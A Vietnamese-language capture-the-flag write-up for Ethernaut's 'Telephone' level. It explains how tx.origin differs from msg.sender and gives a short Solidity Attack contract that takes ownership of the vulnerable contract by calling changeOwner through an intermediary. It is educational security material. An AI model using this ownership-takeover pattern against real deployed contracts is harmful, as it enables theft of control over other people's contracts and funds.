# Level 4: Telephone
## ★☆☆☆☆
## Given contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```
## Phân tích
- Ta thấy trong contract có tx.origin, vậy nó là gì và hoạt động ra sao ?
- Hiểu đơn giản về ``tx.origin`` là nếu bạn gọi function từ một contract A, trong function có có gọi function của contract B, thì tx.origin là địa chỉ của bạn còn msg.sender là contract A address.  

- Đây là một trong những lỗi bảo mật phổ biển của smart contract vì các dev thường hay nhầm lẫn giữa ``msg.sender`` và ``tx.origin``. Hậu quả của việc này thường là các cuộc phising attack.

## tx.origin và msg.sender

Hai biến này khá khác nhau, mặc dù cùng trả về address nhưng tx.origin sẽ trả về địa chỉ của địa chỉ tạo ra transaction còn msg.sender sẽ trả về địa chỉ gọi đến message đó.
> tx.origin (address): sender of the transaction (full call chain)

> msg.sender (address): sender of the message (current call)

![](https://miro.medium.com/v2/resize:fit:1200/1*Q_mcX4Po8JTKUS2yJhvcPQ.png)

Bạn có thể xem các global variable khác tại [đây](https://docs.soliditylang.org/en/v0.8.21/units-and-global-variables.html#block-and-transaction-properties)  
## Solution
**Target**: chiếm quyền owner của contract.  

- Compile và deploy contract này trên remix, sau đó gọi hàm ``claimOwwnership()``:  

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.6 <0.9.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
contract Attack {
    Telephone t;
   address my_addr = 0xee35AA525a1bc43aFb437C8F2b9a58B151A50e53;
   constructor(){
    t = Telephone(my_addr);
   }
   function claimOwnership() public {
      t.changeOwner(msg.sender);
   }

}
```
- Check lại owner:
```javascript
await contract.owner()
```
**Submit** -> Done

## Reference
https://medium.com/@natelapinski/the-difference-between-tx-origin-60737d3b3ab5


